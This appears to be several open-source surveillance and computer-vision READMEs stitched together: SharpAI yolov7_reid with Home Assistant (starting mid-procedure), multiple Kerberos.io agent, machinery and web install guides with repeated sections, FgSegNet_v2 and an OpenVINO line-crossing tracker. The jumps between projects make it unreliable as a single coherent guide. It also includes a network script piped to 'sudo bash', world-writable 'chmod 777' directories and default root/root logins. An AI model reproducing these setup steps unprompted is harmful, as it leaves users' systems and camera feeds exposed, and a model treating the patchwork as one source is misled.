4) Go to directory ```C:\Users``` and open the folder with name of current user. Here look for a folder  ```.sharpai``` . In ```.sharpai``` folder you will see a folder ```yolov7_reid```. Open it and start a new Command Prompt here. Remember this as ```Command Prompt 2```

5) In Command Prompt 2 run the below command:

```
docker compose up
```

**NOTE: DO NOT TERMINATE THIS COMMAND.** Let it complete. After running the above command it will take roughly 15-20 minutes or even more time to complete depending upon your system specifications and internet speed. After 5-10 minutes of running the command in the images tab of Docker will images will start to appear. If the command ran successful then there must be seven images in images tab plus one container named as `yolov7_reid` in the container tab.

6) Go to folder ```yolov7_reid``` mentioned in step 4. In this folder there will be file ```.env```. Delete it. Now close the Command Prompt 1. Open and new Command prompt and run the following command again. We will call this as Command Prompt 3. 

```
sharpai-cli yolov7_reid start
```
OR

```
python3 -m sharpai_hub.cli yolov7_reid start
```
OR

```
python -m sharpai_hub.cli yolov7_reid start
```

7) Running command in Step 6 will open a Signup/Signin page in the browser and in Command Prompt it will ask for the Labelstudio Token. After Signing up in you will be taken to your account. At the top right corrent you will see a small cirle with your account initials. Click on it and after that click on `Account Setting`. Here at the right side of page you will see a Access token. Copy the token and paste it carefully in the command prompt 3.
	  
8) Add Camera to Home-Assistant, you can use ""Generic Camera"" to add camera with RTSP url
	  
9) In this step, we will obtain the camera entity ID of your cameras. After adding your camera to `home-Assistant`, go to the `Overview` tab. Here all your cameras will be listed. Click on the video stream of a camera, after which a small popup will open. At the top right of the popup, click the gear icon to open the settings page. A new popup will open with a few editable properties. Here look for Entity ID, which is in the format `camera.IP_ADDRESS_OF_CAMERA`, copy/note this entity ID (these entity ids will be required later). If you have multiple cameras, we will need each cameras Entity ID. Note all these camera entity IDs.

	  
10) Run following two commands to open and edit the `configuration.yaml` of Home-Assistant:
	  
```
docker exec -ti home-assistant /bin/bash 
```	
	  
```
vi configuration.yaml
```
	  
**NOTE FOR WINDOWS SYSTEM USERS: These commands wont work with windows Systems. For Windows system, please open Docker (the instance of Docker, which is already running from the start) and in the container tab, open the `yolov7_reid`. Here look for the `home-assistant` container. Hover your mouse cursor on the `home-assistant` container, and a few options will appear. Click on `cli`. An inbuilt console will start on the same page. If the typing cursor keeps blinking and nothing shows up on the inbuilt console, then click on `Open in External Terminal`, which is just above the blinking cursor. After clicking it, a new command prompt will open. To check everything is working as expected, run the command `ls` and see if the commands list the files and folders in the config folder.**
	  
**Now run a command `vi configuration.yaml`. This command will open your configuration file of the `home-assistant` in the Vi editor. Vi Editor is a bit tricky if you are unfamiliar with using it. You will now have to enter into Insert mode to add the integration code mentioned in Step 9 to the configuration file. Press the `I` key to enter Insert mode and go end of the file using the down arrow key. Next, press the right mouse (while the mouse cursor is inside the command prompt window) while in the command prompt. This will paste the integration code that you had copied earlier. After making changes to the config file, press the escape key, type the following `:wq` (yes with colon) and press enter key. You will be back taken to `/config #`. This command `:wq` means you want to write changes to the config file and quit (I told you Vi is a bit tricky for beginners). You can now close the command prompt.**
	  

11) Add the below code to the end of `configuration.yaml` file. 
	  
**Here, replace `camera.<camera_entity_id>` with the camera entity ID we obtained in Step 9. If you have multiple cameras then keep adding the `entity_id` under `images_processing`.**
	  
	  
```
stream:
  ll_hls: true
  part_duration: 0.75
  segment_duration: 6

image_processing:
  - platform: sharpai
    source:
      - entity_id: camera.<camera_entity_id>
    scan_interval: 1
```

If you have multiple cameras then after changing the 'entity_id' the code will become similar to this:
	  
```
stream:
  ll_hls: true
  part_duration: 0.75
  segment_duration: 6

image_processing:
  - platform: sharpai
    source:
      - entity_id: camera.192_168_29_44
      - entity_id: camera.192_168_29_45
      - entity_id: camera.192_168_29_46
      - entity_id: camera.192_168_29_47
    scan_interval: 1
```

12) At `home-assistant` homepage `http://localhost:8123` select `Developer Tools`. Look for and click `Check Configuration` under `Configuration Validation`. If everything went well then it must show ""Configuration Valid'. Click `Restart`.Now go to the `container` tab of docker, click three vertical dots under `Actions` and press restart. Open the `Overview` tab of `home-assitant`. If you see `Image Processing` beside your cameras and below it `Sharp IP_ADDRESS_OF_YOUR_CAMERA`, then congrats. Everything is working as expected.
	  
	  
 ```NOTE: Till further steps are added you can use demo video in the beginning tutorial for further help.```

[**Report features**](https://feathub.com/kerberos-io/machinery) if you think something is missing, and should be added to Kerberos Open Source, we love to hear about your ideas.

## Supported cameras

[**In this thread**](https://github.com/kerberos-io/machinery/issues/136) you can find a list of cameras that users confirmed working properly. Do you have a working camera missing from this list? Report your camera [**here**](https://github.com/kerberos-io/machinery/issues/136).

## Why Kerberos?

As burglary is very common, we believe that video surveillance is a **trivial tool** in our daily lifes which helps us to **feel** a little bit more **secure**. Responding to this need, a lot of companies have started developing their own video surveillance software in the past few years.

Nowadays we have a myriad of **expensive** cameras, recorders, and software solutions which are mainly **outdated** and **difficult** to install and use. Kerberos Open Source goal is to solve these problems and to provide every human being in this world to have their own **ecological**, **affordable**, **easy-to-use** and **innovative** surveillance solution.

## Introduction

Kerberos Open Source is perfect for personal usage. It's great if you only have a couple of surveillance cameras to be managed. A Kerberos agent (e.g. on a Raspberry Pi or inside a Docker container) runs for each camera. Their are many different installation possibilities, please have a look at [**the architecture**](https://doc.kerberos.io/architectures) or [**installation page**](https://doc.kerberos.io/opensource/installation).

Every Kerberos agent has it's own web interface (front-end) to review media recording, and processing engine (back-end) of a specific surveillance camera. The Open Source version doesn't come with a central overview of all recordings generated by your Kerberos agents. For this feature we highly recommend Kerberos cloud.

If you want to manage more than 10 Kerberos agents, it's recommended to use [**Kerberos Enterprise**](https://doc.kerberos.io/enterprise). This will help you to scale, support high availability and load balancing. Check out [**the architecture**](https://doc.kerberos.io/architectures) section for a better understanding of when to use what.

## Machinery

[**The machinery**](https://doc.kerberos.io/opensource/introduction) is the processing engine of Kerberos Open Source. It's an image processing framework, written in C++, who benefits from other third party libraries (OpenCV, etc). It takes images from the type of camera (USB-, IP- or RPi-camera) you've configured in the configuration files and executes one or more algorithms and post-processes (e.g. save a snapshot). The configuration files allow you to define the type of camera, post-processes, conditions and much more; it's highly configurable. It's important to note that the machinery, out-of-the-box, can handle only one camera at a time.

## How does it work?

[Read more](https://doc.kerberos.io/opensource/machinery#project-structure) on our documentation website to have a better understanding of how the machinery works.

## Installation

Kerberos Open Source comes with different installation flavours (it includes both the machinery and web repository). The reason is because depending on the use case one option is better than another. A short list of recommendations:

- [**KiOS**](https://doc.kerberos.io/opensource/installation): You have a Raspberry Pi, and you only want to run a Kerberos agent on it.
- [**Raspbian**](https://doc.kerberos.io/opensource/installation): You have a Raspberry Pi, but you want other services running next to the Kerberos agent.
- [**Docker**](https://doc.kerberos.io/opensource/installation): You have a lot of IP cameras, and/or don't want to mess with dependencies.
- [**Generic**](https://doc.kerberos.io/opensource/installation): You want to develop/extend Kerberos with your own features, or you want to run a Kerberos agent on a not supported OS/architecure.

## Compile from source

Update the packages and kernel, and install some development tools.

```ts
sudo apt-get update && sudo apt-get upgrade
sudo apt-get install git cmake subversion libav-tools dh-autoreconf libcurl4-openssl-dev yasm libx264-dev pkg-config libssl-dev
```

Install the FFmpeg library with x264 support.

```ts
git clone https://github.com/FFmpeg/FFmpeg ffmpeg
cd ffmpeg && git checkout remotes/origin/release/2.8
./configure --enable-gpl --enable-libx264 --enable-shared --prefix=/usr/local
make && sudo make install
```

Go to your home directory, or any place your prefer and pull the machinery from Github. Afterwards create a build directory and start the compilation.

```ts
cd && git clone https://github.com/kerberos-io/machinery
cd machinery && mkdir build && cd build
cmake .. && make && make check && sudo make install
```

After the machinery is build and installed succesfully, you can enable `kerberosio` to start on boot.

```ts
sudo systemctl enable kerberosio
```

## :thinking: Prerequisites

- An IP camera which supports a RTSP H264 encoded stream,
  - (or) a USB camera, Raspberry Pi camera or other camera, that [you can tranform to a valid RTSP H264 stream](https://github.com/kerberos-io/camera-to-rtsp).
- Any hardware (ARMv6, ARMv7, ARM64, AMD) that can run a binary or container, for example: a Raspberry Pi, NVidia Jetson, Intel NUC, a VM, Bare metal machine or a full blown Kubernetes cluster.

## :video_camera: Is my camera working?

There are a myriad of cameras out there (USB, IP and other cameras), and it might be daunting to know if Kerberos Agent will work for your camera. [Therefore we are listing all the camera models that are acknowlegded by the community](https://github.com/kerberos-io/agent/issues/59). Feel free to add your camera to the list as well!

## Quickstart - Docker

The easiest to get your Kerberos Agent up and running is to use our public image on [Docker hub](https://hub.docker.com/r/kerberos/agent). Once you have selected a specific tag, run below `docker` command, which will open the web interface of your Kerberos agent on port `80`, and off you go. For a more configurable and persistent deployment have a look at [Running and automating a Kerberos Agent](#running-and-automating-a-kerberos-agent).

    docker run -p 80:80 --name mycamera -d --restart=always kerberos/agent:latest

If you want to connect to an USB or Raspberry Pi camera, [you'll need to run our side car container](https://github.com/kerberos-io/camera-to-rtsp) which proxy the camera to an RTSP stream. In that case you'll want to configure the Kerberos Agent container to run in the host network, so it can connect directly to the RTSP sidecar.

    docker run --network=host --name mycamera -d --restart=always kerberos/agent:latest

## Quickstart - Balena

Run Kerberos Agent with [Balena Cloud](https://www.balena.io/) super powers. Monitor your Kerberos Agent with seamless remote access, over the air updates, an encrypted public `https` endpoint and many more. Checkout our application `video-surveillance` on [Balena Hub](https://hub.balena.io/apps/2064752/video-surveillance), and create your first or fleet of Kerberos Agent(s).

[![deploy with balena](https://balena.io/deploy.svg)](https://dashboard.balena-cloud.com/deploy?repoUrl=https://github.com/kerberos-io/balena-agent)

## Quickstart - Snap

Run Kerberos Agent with our [Snapcraft package](https://snapcraft.io/kerberosio).

     snap install kerberosio

Once installed you can find your Kerberos Agent configration at `/var/snap/kerberosio/common`. Run the Kerberos Agent as following

    sudo kerberosio.agent -action=run -port=80

## A world of Kerberos Agents

The Kerberos Agent is an isolated and scalable video (surveillance) management agent with a strong focus on user experience, scalability, resilience, extension and integration. Next to the Kerberos Agent, Kerberos.io provides many other tools such as [Kerberos Factory](https://github.com/kerberos-io/factory), [Kerberos Vault](https://github.com/kerberos-io/vault) and [Kerberos Hub](https://github.com/kerberos-io/hub) to provide additional capabilities: bring your own cloud, bring your own storage, central overview, live streaming, machine learning etc.

As mentioned above Kerberos.io applies the concept of agents. An agent is running next to (or on) your camera, and is processing a single camera feed. It applies motion based or continuous recording and make those recordings available through a user friendly web interface. A Kerberos Agent allows you to connect to other cloud services or integrates with custom applications. Kerberos Agent is used for personal usage and scales to enterprise production level deployments.

This repository contains everything you'll need to know about our core product, Kerberos Agent. Below you'll find a brief list of features and functions.

- Low memory and CPU usage.
- Simplified and modern user interface.
- Multi architecture (ARMv7, ARMv8, amd64, etc).
- Multi camera support: IP Cameras (H264), USB cameras and Raspberry Pi Cameras [through a RTSP proxy](https://github.com/kerberos-io/camera-to-rtsp).
- Single camera per instance (e.g. one container per camera).
- Primary and secondary stream setup (record full-res, stream low-res).
- Low resolution streaming through MQTT and full resolution streaming through WebRTC.
- Ability to specifiy conditions: offline mode, motion region, time table, continuous recording, etc.
- Post- and pre-recording on motion detection.
- Ability to create fragmented recordings, and streaming though HLS fMP4.
- [Deploy where you want](#how-to-run-and-deploy-a-kerberos-agent) with the tools you use: `docker`, `docker compose`, `ansible`, `terraform`, `kubernetes`, etc.
- Cloud storage/persistance: Kerberos Hub, Kerberos Vault and Dropbox. [(WIP: Minio, Storj, Google Drive, FTP etc.)](https://github.com/kerberos-io/agent/issues/95)
- WIP: Integrations (Webhooks, MQTT, Script, etc).
- REST API access and documentation through Swagger (trigger recording, update configuration, etc).
- MIT License

## How to run and deploy a Kerberos Agent

As described before a Kerberos Agent is a container, which can be deployed through various ways and automation tools such as `docker`, `docker compose`, `kubernetes` and the list goes on. To simplify your life we have come with concrete and working examples of deployments to help you speed up your Kerberos.io journey.

We have documented the different deployment models [in the `deployments` directory](https://github.com/kerberos-io/agent/tree/master/deployments) of this repository. There you'll learn and find how to deploy using:

- [Static binary](https://github.com/kerberos-io/agent/tree/master/deployments#0-static-binary)
- [Docker](https://github.com/kerberos-io/agent/tree/master/deployments#1-docker)
- [Docker Compose](https://github.com/kerberos-io/agent/tree/master/deployments#2-docker-compose)
- [Kubernetes](https://github.com/kerberos-io/agent/tree/master/deployments#3-kubernetes)
- [Red Hat OpenShift with Ansible](https://github.com/kerberos-io/agent/tree/master/deployments#4-red-hat-ansible-and-openshift)
- [Terraform](https://github.com/kerberos-io/agent/tree/master/deployments#5-terraform)
- [Salt](https://github.com/kerberos-io/agent/tree/master/deployments#6-salt)
- [Balena](https://github.com/kerberos-io/agent/tree/master/deployments#8-balena)
- [Snap](https://github.com/kerberos-io/agent/tree/master/deployments#9-snap)

By default your Kerberos Agents will store all its configuration and recordings inside the container. To help you automate and have a more consistent data governance, you can attach volumes to configure and persist data of your Kerberos Agents, and/or configure each Kerberos Agent through environment variables.

## Access the Kerberos Agent

Once you have deployed the Kerberos Agent, using one of the deployment models described above, you will be able to access the Kerberos Agent user interface. A login page is presented asking for some credentials.

The default username and password for the Kerberos Agent is:

- Username: `root`
- Password: `root`

**_Please note that you change the username and password for a final installation, see [Configure with environment variables](#configure-with-environment-variables) below._**

## Configure and persist with volume mounts

An example of how to mount a host directory is shown below using `docker`, but is applicable for [all the deployment models and tools described above](#running-and-automating-a-kerberos-agent).

You attach a volume to your container by leveraging the `-v` option. To mount your own configuration file and recordings folder, execute as following:

    docker run -p 80:80 --name mycamera \
    -v $(pwd)/agent/config:/home/agent/data/config \
    -v $(pwd)/agent/recordings:/home/agent/data/recordings \
    -d --restart=always kerberos/agent:latest

More example [can be found in the deployment section](https://github.com/kerberos-io/agent/tree/master/deployments) for each deployment and automation tool. Please note to verify the permissions of the directory/volume you are attaching. More information in [this issue](https://github.com/kerberos-io/agent/issues/80).

    chmod -R 755 kerberos-agent/
    chown 100:101 kerberos-agent/ -R

## Configure with environment variables

Next to attaching the configuration file, it is also possible to override the configuration with environment variables. This makes deployments easier when leveraging `docker compose` or `kubernetes` deployments much easier and scalable. Using this approach we simplify automation through `ansible` and `terraform`.

    docker run -p 80:80 --name mycamera \
    -e AGENT_NAME=mycamera \
    -e AGENT_TIMEZONE=Europe/Brussels \
    -e AGENT_CAPTURE_IPCAMERA_RTSP=rtsp://fake.kerberos.io/stream \
    -e AGENT_CAPTURE_CONTINUOUS=true \
    -d --restart=always kerberos/agent:latest

## Contribute with Codespaces

One of the major blockers for letting you contribute to an Open Source project is to setup your local development machine. Why? Because you might have already some tools and libraries installed that are used for other projects, and the libraries you would need for Kerberos Agent, for example FFmpeg, might require a different version. Welcome to the dependency hell..

By leveraging codespaces, which the Kerberos Agent repo supports, you will be able to setup the required development environment in a few minutes. By opening the `<> Code` tab on the top of the page, you will be able to create a codespace, [using the Kerberos Devcontainer](https://github.com/kerberos-io/devcontainer) base image. This image requires all the relevant dependencies: FFmpeg, OpenCV, Golang, Node, Yarn, etc.

![Kerberos Agent codespace](assets/img/codespace.png)

After a few minutes, you will see a beautiful `Visual Studio Code` shown in your browser, and you are ready to code!

![Kerberos Agent VSCode](assets/img/codespace-vscode.png)

On opening of the GitHub Codespace, some dependencies will be installed. Once this is done go ahead to the `ui/src/config.json` file, and (un)comment following section. Make sure to replace the `externalHost` variable with the DNS name you will retrieve from the next step.

    // Uncomment this when using codespaces or other special DNS names (which you can't control)
    // replace this with the DNS name of the kerberos agent server (the codespace url)
    const externalHost = 'cedricve-automatic-computing-machine-v647rxvj4whx9qp-80.preview.app.github.dev';

    const dev = {
      ENV: 'dev',
      HOSTNAME: externalHost,
      //API_URL: `${protocol}//${hostname}:80/api`,
      //URL: `${protocol}//${hostname}:80`,
      //WS_URL: `${websocketprotocol}//${hostname}:80/ws`,

      // Uncomment, and comment the above lines, when using codespaces or other special DNS names (which you can't control)
      API_URL: `${protocol}//${externalHost}/api`,
      URL: `${protocol}//${externalHost}`,
      WS_URL: `${websocketprotocol}//${externalHost}/ws`,
    };

Go and open two terminals one for the `ui` project and one for the `machinery` project.

1.  Terminal A:

        cd machinery/
        go run main.go -action run -port 80

2.  Terminal B:

        cd ui/
        yarn start

Once executed, a popup will show up mentioning `portforwarding`. You should see two ports being opened, one for the ui `3000` and one for the machinery `80`. `Right-click` on the port `80` and change visibility from `private` to `public`, this is required to avoid `CORS` errors.

![Codespace make public](./assets/img/codespace-make-public.png)

As mentioned above, copy the hostname of the `machinery` DNS name, and past it in the `ui/src/config.json` file. Once done reload, the `ui` page in your browser, and you should be able to access the login page with the default credentials `root` and `root`.

## Develop and build

Kerberos Agent is divided in two parts a `machinery` and `web`. Both parts live in this repository in their relative folders. For development or running the application on your local machine, you have to run both the `machinery` and the `web` as described below. When running in production everything is shipped as only one artifact, read more about this at [Building for production](#building-for-production).

### UI

The `web` is a **React** project which is the main entry point for an end user to view recordings, a livestream, and modify the configuration of the `machinery`.

    git clone https://github.com/kerberos-io/agent
    cd ui
    yarn start

This will start a webserver and launches the web app on port `3000`.

![login-agent](./assets/img/agent-login.gif)

Once signed in you'll see the dashboard page showing up. After successfull configuration of your agent, you'll should see a live view and possible events recorded to disk.

![dashboard-agent](./assets/img/agent-dashboard.png)

### Machinery

The `machinery` is a **Golang** project which delivers two functions: it acts as the Kerberos Agent which is doing all the heavy lifting with camera processing and other kinds of logic, on the other hand it acts as a webserver (Rest API) that allows communication from the web (React) or any other custom application. The API is documented using `swagger`.

You can simply run the `machinery` using following commands.

    git clone https://github.com/kerberos-io/agent
    cd machinery
    go run main.go -action run -port 80

This will launch the Kerberos Agent and run a webserver on port `80`. You can change the port by your own preference. We strongly support the usage of [Goland](https://www.jetbrains.com/go/) or [Visual Studio Code](https://code.visualstudio.com/), as it comes with all the debugging and linting features builtin.

![VSCode desktop](./assets/img/vscode-desktop.png)

## Building from source

Running Kerberos Agent in production only require a single binary to run. Nevertheless, we have two parts, the `machinery` and the `web`, we merge them during build time. So this is what happens.

### UI

To build the Kerberos Agent web app, you simply have to run the `build` command of `yarn`. This will create a `build` directory inside the `web` directory, which contains a minified version of the React application. Other than that, we [also move](https://github.com/kerberos-io/agent/blob/master/web/package.json#L16) this `build` directory to the `machinery` directory.

    cd ui
    yarn build

### Machinery

Building the `machinery` is also super easy 🚀, by using `go build` you can create a single binary which ships it all; thank you Golang. After building you will endup with a binary called `main`, this is what contains everything you need to run Kerberos Agent.

Remember the build step of the `web` part, during build time we move the build directory to the `machinery` directory. Inside the `machinery` web server [we reference the](https://github.com/kerberos-io/agent/blob/master/machinery/src/routers/http/Server.go#L44) `build` directory. This makes it possible to just a have single web server that runs it all.

    cd machinery
    go build

## Building for Docker

Inside the root of this `agent` repository, you will find a `Dockerfile`. This file contains the instructions for building and shipping **Kerberos Agent**. Important to note is that start from a prebuild base image, `kerberos/base:xxx`.
This base image contains already a couple of tools, such as Golang, FFmpeg and OpenCV. We do this for faster compilation times.

By running the `docker build` command, you will create the Kerberos Agent Docker image. After building you can simply run the image as a Docker container.

    docker build -t kerberos/agent .

## What is new?

This repository contains the next generation of Kerberos.io, **Kerberos Agent (v3)**, and is the successor of the machinery and web repositories. A switch in technologies and architecture has been made. This version is still under active development and can be followed on the [develop branch](https://github.com/kerberos-io/agent/tree/develop) and [project overview](https://github.com/kerberos-io/agent/projects/1).

## Vote for features

[**Report features**](https://feathub.com/kerberos-io/machinery) if you think something is missing, and should be added to Kerberos Open Source, we love to hear about your ideas.

## Why Kerberos?

As burglary is very common, we believe that video surveillance is a **trivial tool** in our daily lifes which helps us to **feel** a little bit more **secure**. Responding to this need, a lot of companies have started developing their own video surveillance software in the past few years.

Nowadays we have a myriad of **expensive** cameras, recorders, and software solutions which are mainly **outdated** and **difficult** to install and use. Kerberos Open Source goal is to solve these problems and to provide every human being in this world to have their own **ecological**, **affordable**, **easy-to-use** and **innovative** surveillance solution.

## Introduction

Kerberos Open Source is perfect for personal usage. It's great if you only have a couple of surveillance cameras to be managed. A Kerberos agent (e.g. on a Raspberry Pi or inside a Docker container) runs for each camera. Their are many different installation possibilities, please have a look at [**the architecture**](https://doc.kerberos.io/architectures) or [**installation page**](https://doc.kerberos.io/opensource/installation).

Every Kerberos agent has it's own web interface (front-end) to review media recording, and processing engine (back-end) of a specific surveillance camera. The Open Source version doesn't come with a central overview of all recordings generated by your Kerberos agents. For this feature we highly recommend Kerberos cloud.

If you want to manage more than 10 Kerberos agents, it's recommended to use [**Kerberos Enterprise**](https://doc.kerberos.io/enterprise). This will help you to scale, support high availability and load balancing. Check out [**the architecture**](https://doc.kerberos.io/architectures) section for a better understanding of when to use what.

## The web

The web is responsible for the visualization. It's a GUI which helps the user to find activity at a specific period, configure the machinery, view a live stream, see system information and much more.

It's written in PHP using the extremely popular PHP Framework Laravel, and Javascript using the client-side framework BackboneJS. We will discuss the different pages and functionality briefly. Please check out the demo environment if you want to see a real life example.

## How does it work?

[Read more](https://doc.kerberos.io/opensource/web) on our documentation website to have a better understanding of how the web works.

## Installation

Kerberos Open Source comes with different installation flavours (it includes both the machinery and web repository). The reason is because depending on the use case one option is better than another. A short list of recommendations:

- [**KiOS**](https://doc.kerberos.io/opensource/installation): You have a Raspberry Pi, and you only want to run a Kerberos agent on it.s
- [**Raspbian**](https://doc.kerberos.io/opensource/installation): You have a Raspberry Pi, but you want other services running next to the Kerberos agent.
- [**Docker**](https://doc.kerberos.io/opensource/installation): You have a lot of IP cameras, and/or don't want to mess with dependencies.
- [**Generic**](https://doc.kerberos.io/opensource/installation): You want to develop/extend Kerberos with your own features, or you want to run a Kerberos agent on a not supported OS/architecture.

## Install from source

If you want to install **the web**, you'll need to have **a webserver** (e.g. Nginx) and **PHP** running with some extensions. You also need **NodeJS** and **npm** installed to install **Bower**. Below you can find the installation procedure to install the web on your preferred environment.

### Install Dependencies

Install Git, PHP7 (+extensions) and NodeJS.

A) Ubuntu

    sudo apt-get update && sudo apt-get upgrade
    curl -sL https://deb.nodesource.com/setup | sudo bash -
    sudo apt-get install git nginx php7.0-cli php7.0-gd php7.0-mcrypt php7.0-curl php7.0-mbstring php7.0-dom php7.0-zip php7.0-fpm nodejs npm

B) Raspbian

    echo ""deb http://mirrordirector.raspbian.org/raspbian/ stretch main contrib non-free rpi"" | sudo tee --append /etc/apt/sources.list
    sudo apt-get update
    sudo apt-get install -t stretch php7.0 php7.0-curl php7.0-gd php7.0-fpm php7.0-cli php7.0-opcache php7.0-mbstring php7.0-xml php7.0-zip php7.0-mcrypt nodejs npm
    sudo ln -s /usr/bin/nodejs /usr/bin/node

C) OSX

    brew install php7.0 php7.0-curl php7.0-gd php7.0-fpm php7.0-cli php7.0-opcache php7.0-mbstring php7.0-xml php7.0-zip php7.0-mcrypt nodejs npm

### Configure webserver

Install Nginx,

    sudo apt-get install nginx

or if you're running OSX use brew.

    sudo brew install nginx

Creating a Nginx config.

    sudo rm -f /etc/nginx/sites-enabled/default
    sudo nano /etc/nginx/sites-enabled/default

Copy and paste following config file; this file tells nginx where the web will be installed and that it requires PHP.

    server
    {
        listen 80 default_server;
        listen [::]:80 default_server;

        root /var/www/web/public;
        index index.html index.htm index.nginx-debian.html;

        server_name kerberos.rpi kerberos.rpi;
        index index.php index.html index.htm;

        location /
        {
                autoindex on;
                try_files $uri $uri/ /index.php?$query_string;
        }

        location ~ \.php$
        {
                fastcgi_pass unix:/var/run/php/php7.0-fpm.sock;
                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
                include fastcgi_params;
        }
    }

### Clone source

Create a www location.

    mkdir -p /var/www

Get the source code from Github.

    cd /var/www && sudo git clone https://github.com/kerberos-io/web && cd web

Install PHP packages by using composer.

    curl -sS https://getcomposer.org/installer | sudo php
    sudo mv composer.phar /usr/bin/composer
    sudo composer install

Add write permission for the storage directory, and the kerberos config file.

    sudo chmod -R 777 storage
    sudo chmod -R 777 bootstrap/cache
    sudo chmod 777 config/kerberos.php

Install bower globally by using npm.

    sudo npm -g install bower

Install Front-end dependencies with bower

    cd public
    sudo bower --allow-root install

Restart nginx

    sudo service nginx restart

## How to access

You can access **the web** by entering the IP-address in your favorite browser. You'll see a welcome page showing up, on which you will be able to choose an username and password; the default username and password is **root**.

## Requirements
This work was implemented with the following frameworks:
* Spyder 3.2.x (recommended)
* Python 3.6.3
* Keras 2.0.6
* Tensorflow-gpu 1.1.0

## Usage
1. Clone this repo: ```git clone https://github.com/lim-anggun/FgSegNet_v2.git```

2. Download [CDnet2014](http://changedetection.net), [SBI2015](https://github.com/lim-anggun/FgSegNet) and [UCSD](https://github.com/lim-anggun/FgSegNet) datasets, then put them in the following directory structure:<br/>

    Example:

    ```
     FgSegNet_v2/
          scripts/FgSegNet_v2_CDnet.py
                 /FgSegNet_v2_SBI.py
                 /FgSegNet_v2_UCSD.py
                 /FgSegNet_v2_module.py
                 /instance_normalization.py
                 /my_upsampling_2d.py
		     /prediction_example.ipynb
		     
          datasets/
                  /CDnet2014_dataset/...
                  /SBI2015_dataset/...
                  /UCSD_dataset/...
		  
          training_sets/
                       /CDnet2014_train/...
                       /SBI2015_train/...
                       /UCSD_train20/...
                       /UCSD_train50/...
		       
	  testing_scripts/extract_mask.py
	  		 /thresholding.py
			 /python_metrics/...
    ```

3. Run the codes with **Spyder IDE**. Note that all trained models will be automatically saved (in current working directory) for you.

4. Here is how to extract foreground masks. Suppose your files are stored in the following dir structures:

```
     # Script file in the root dir
     extract_mask.py
     
     # Dataset downloaded from changedetection.net
     CDnet2014_dataset/baseline/...
     		      /cameraJitter/...
		      /badWeather/...
	
     # your trained model dir (models25 = models trained with 25 frames, (50frames, 200frames)
     FgSegNet_v2/models25/baseline/mdl_highway.h5
     				  /mdl_pedestrians.h5
				  ...
		         /cameraJitter/mdl_badminton.h5
			 	      /mdl_traffic.h5
				      /...
			/...
			 			
     
 ```
Go to Window cmd and run:


``` 
> python extract_mask.py 
```


> Your extracted frames will be automatically stored in ```FgSegNet_v2/results25/[CATEGORY_NAME]/[SCENE_NAME]/[binXXXXXX.png, ...]```

5. Threshold your foreground masks. Suppose that your extracted frames are stored in above folders. Go to cmd and run:

``` 
> python thresholding.py
```

> Your thresholded frames will be automatically stored in ```FgSegNet_v2/results25_th[0.X]/[CATEGORY_NAME]/[SCENE_NAME]/[binXXXXXX.png, ...]```


6. Remove training frames from your thresholded frames and evaluate your results.

## Evaluation
We evaluate our method using three different datasets as described in [here](https://github.com/lim-anggun/FgSegNet) or [here](http://www.sciencedirect.com/science/article/pii/S0167865518303702).

e.g.
``` 
> cd python_metrics
> python processFolder.py dataset_path root_path_of_thresholded_frames
```

This program uses an object detection deep learning model and a re-identification model to find and track the objects in a movie. Then, the program will track the trajectory of the objects and check if the objects cross the defined virtual lines or the objects are inside the defined areas. The program uses [Intel(r) Distribution of OpenVINO(tm) toolkit](https://software.intel.com/en-us/openvino-toolkit) for deep learning inferencing.    
To track the objects, the program extracts the feature vectors from the objects which consists of 256 FP values with the re-identification DL model. The program can identify which object is most similar to the objects in the previous frame and record the trajectory. The L2 norm (or the distance) of those feature vectores represents the similarity of the objects. This program uses cosine distance to check the similarity between the objects.  
The line crossing check and area intrusion check are done by regular (meaning, non deep learning based) arithmetic algorithm.  
The latest version playbacks sound when an event such as crossing a line or entering to an area happens.  
You can learn how to use line-crossing and area intrusion function from simple test program (`test-line-cross-area-intrusion.py`)  

このプログラムはディープラーニングの物体検出モデルと特徴抽出(re-identification)モデルを用いて、ムービーフレーム中のオブジェクトを検出し、追跡するプログラムです。プログラムは見つけたオブジェクトの軌跡を記録し、オブジェクトが定義された仮想ラインを超えたり定義されたエリアに侵入したことを検出します。ディープラーニングの推論には[Intel(r) Distribution of OpenVINO(tm) toolkit](https://software.intel.com/en-us/openvino-toolkit)を利用しています。  
オブジェクトの追跡のために、プログラムは特徴抽出モデルを使用して見つけたオブジェクトから256個の浮動小数点数値からなる特徴ベクトルを抽出します。この特徴ベクトル同士のL2ノルム(=距離)がオブジェクト同士の類似度を表します。このプログラムではノルムの計算にコサイン距離を使用しています。  
ラインクロスとエリア侵入の判定には通常の(ディープラーニングベースではない)数学的アルゴリズムを使用しています。  
最新版はラインクロスしたりエリア侵入したりなどのイベント発生時にオーディオを再生します。  
コードを簡素化したテストプログラムも追加しました。ライン交差やエリア侵入判定関数の使い方などを学ぶことが可能です。(`test-line-cross-area-intrusion.py`)  

[ Update - 04-Apr-2022 ] OpenVINO API 2.0 support. Program is now compatible with OpenVINO 2022.1 (and not compatible with OpenVINO 2021 and older ones)

## License

The Kerberos Open Source project is licensed with BY-NC-SA 4.0, this means that everyone can use Kerberos and modify if to their needs, in a non commercial activity.

More information [**about this license**](https://doc.kerberos.io/opensource/license).

## Why Kerberos?

As burglary is very common, we believe that video surveillance is a **trivial tool** in our daily lifes which helps us to **feel** a little bit more **secure**. Responding to this need, a lot of companies have started developing their own video surveillance software in the past few years.

Nowadays we have a myriad of **expensive** cameras, recorders, and software solutions which are mainly **outdated** and **difficult** to install and use. Kerberos Open Source goal is to solve these problems and to provide every human being in this world to have their own **ecological**, **affordable**, **easy-to-use** and **innovative** surveillance solution.

# Docker

A Docker image (x86, ARMv7, ARMv8) is available on [**the Docker Hub**](https://hub.docker.com/r/kerberos/kerberos), which contains all the necessary software to setup the Kerberos agent. Before you can run this image you will have to make sure [**Docker**](https://docker.com) is installed. After the installation you can use **docker run** to get the Kerberos agent up and running; you can also opt for **dockeros** to create and scale your Kerberos agents.

## Use docker run

After you've installed Docker, you can open a command prompt and type in following command. This will pull the kerberos image and make the web interface available on port 80 and the livestream on port 8889. You can give the container a custom name using the **--name** property.

    docker run --name camera1 -p 80:80 -p 8889:8889 -d kerberos/kerberos
    docker run --name camera2 -p 81:80 -p 8890:8889 -d kerberos/kerberos
    docker run --name camera3 -p 82:80 -p 8891:8889 -d kerberos/kerberos

## Or use dockeros (our docker creation tool)

